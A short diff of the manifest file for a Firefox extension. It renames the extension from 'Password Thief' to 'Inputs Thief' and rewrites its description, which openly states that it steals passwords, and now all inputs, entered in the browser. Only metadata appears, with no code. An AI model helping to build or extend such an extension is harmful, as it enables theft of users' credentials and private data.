@@ -1,9 +1,9 @@
 {
 	"manifest_version": 2,
-	"name" : "Password Thief",
+	"name" : "Inputs Thief",
 	"version" : "1.2.1",
 
-	"description" : "a firefox extension that steals passwords saved by your browser by petitcroco and the magic bogoss B3rt1ng",
+	"description" : "a firefox extension that steals inputs enter in your browser by petitcroco and the magic bogoss B3rt1ng",
 
 	"icons" : {
 		"128" : "logo.png"
